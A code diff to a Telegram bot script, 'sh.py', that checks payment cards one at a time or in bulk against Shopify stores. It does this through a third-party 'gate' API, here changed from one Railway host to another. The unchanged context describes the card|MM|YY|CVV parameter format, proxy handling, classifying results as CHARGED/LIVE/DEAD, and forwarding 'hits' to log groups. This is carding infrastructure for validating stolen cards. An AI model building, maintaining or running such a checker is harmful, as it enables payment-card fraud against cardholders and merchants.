@@ -2,7 +2,7 @@
 sh.py  v28  —  /sh single-card + /msh mass Shopify checker
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Framework : python-telegram-bot v21
-API       : https://lucifer.up.railway.app/
+API       : https://shopi.up.railway.app/shopii
             GET ?cc=NUM|MM|YY|CVV&site=DOMAIN&proxy=http://ip:port
             site  = plain domain, NO https:// prefix
             proxy = http://ip:port  (WITH http:// prefix)
@@ -17,7 +17,7 @@ ROOT-CAUSE FIX:
 SITES:
   Sites are loaded exclusively from sites.txt on disk.
   _load_sites() reads sites.txt; stops with a clear error if the file is missing.
-  No built-in fallback list  keep sites.txt updated.
+  No built-in fallback list  keep sites.txt updated.
 
 DM POLICY:
   CHARGED → user DM + HIT_LOG_GROUP_ID + EXTRA_CHARGED_GROUP_ID
@@ -80,7 +80,7 @@ LOGS_CHANNEL_LINK   = "https://t.me/+XYnHim3rGsw0Yzdk"             # hits log ch
 SH_COOLDOWN    = 25
 
 # ── Speed / concurrency settings ───────────────────────────────────────────
-# lucifer.up.railway.app is a shared Railway app — it can't handle hundreds of
+# shopi.up.railway.app is a shared Railway app — it can't handle hundreds of
 # simultaneous connections.  Too many concurrent calls → 502/503 errors →
 # real bank responses (PCI_ERROR, GENERIC_ERROR, etc.) never arrive →
 # cards falsely marked DEAD.
@@ -383,7 +383,7 @@ def _is_success_response(resp: str) -> bool:
 
 def classify_response(resp: str) -> str:
     """
-    Classify a response string from lucifer.up.railway.app.
+    Classify a response string from shopi.up.railway.app.
     Returns one of: CHARGED | TDS | LIVE | DEAD | RETRY | ERROR
 
       CHARGED / TDS / LIVE / DEAD  →  final verdict, stop checking this card
@@ -806,7 +806,7 @@ def extract_cards(text: str) -> list:
 def _parse_response_field(data: dict) -> str:
     """Extract the human-readable response string from the API JSON.
 
-    lucifer.up.railway.app returns:
+    shopi.up.railway.app returns:
       {"Status": true/false, "Response": "ORDER_PAID"|"CARD_DECLINED"|...,
        "Gateway": "shopify_payments", "Price": "0.98", "Currency": "USD", ...}
 
@@ -860,9 +860,9 @@ def _normalise_gateway(raw: str) -> str:
 
 async def _call_api(card: str, site: str, proxy: Optional[str],
                     timeout: float = SITE_TIMEOUT) -> tuple:
-    """Call the lucifer.up.railway.app checker API.
+    """Call the shopi.up.railway.app checker API.
 
-    Endpoint : https://lucifer.up.railway.app/
+    Endpoint : https://shopi.up.railway.app/shopii
     Method   : GET
     Params   :
         cc    = CARDNUM|MM|YY|CVV   (pipe-separated, all in one param)
@@ -885,7 +885,7 @@ async def _call_api(card: str, site: str, proxy: Optional[str],
         502/503 responses — hiding real bank results (PCI_ERROR, etc.).
     """
     site_clean = _strip_scheme(site)      # drop any https:// prefix
-    # New API (lucifer.up.railway.app) loads proxies from px.txt server-side
+    # New API (luci.up.railway.app) loads proxies from px.txt server-side
     # automatically — no &proxy= param needed or accepted.
     url = f"{API_URL}?cc={card}&site={site_clean}"
 
@@ -1062,7 +1062,7 @@ async def _check_card_with_retry(
                     continue
 
                 # HTTP-level error from the API server itself (not the Shopify site).
-                # 502/503/504 mean the gate API (lucifer.up.railway.app) is down —
+                # 502/503/504 mean the gate API (shopi.up.railway.app) is down —
                 # retrying with a different Shopify site won't help.
                 if http_st and http_st not in (200,):
                     local_dead.add(site)
@@ -1511,7 +1511,6 @@ COUNTRY_FLAGS = {
     "TW":"🇹🇼","KR":"🇰🇷","IL":"🇮🇱","CH":"🇨🇭","BE":"🇧🇪","AT":"🇦🇹",
     "PT":"🇵🇹","GR":"🇬🇷","CZ":"🇨🇿","HU":"🇭🇺","RO":"🇷🇴","FI":"🇫🇮",
     "DK":"🇩🇰","NO":"🇳🇴","IE":"🇮🇪",
-
 }
 
 
